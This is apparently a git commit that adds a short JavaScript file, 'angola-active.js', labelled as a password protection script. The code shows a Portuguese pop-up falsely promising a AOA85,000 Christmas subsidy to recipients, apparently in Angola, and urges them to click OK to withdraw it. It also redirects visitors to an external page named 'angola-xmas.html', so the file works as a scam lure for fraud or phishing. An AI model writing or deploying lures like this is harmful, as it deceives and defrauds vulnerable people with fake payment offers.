3c386721a15f57ce233e5ab2fc7aa3001cb2b497
itidnewblog4 <ukpehaitid2@gmail.com>
2025-12-03 07:02:43 +0100

    Create angola-active.js

---
+++ angola-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'SAQUE AOA85.000'
+password = prompt(
+  'SMS: Parabéns! Você tem direito a receber o subsídio de Natal AOA85.000. Clique em OK para sacar o dinheiro agora..',
+  'SAQUE AOA85.000'
+);
+if (password != 'SAQUE AOA85.000') {
+  location.href = 'https://phlug.org/angola-xmas.html';
+}
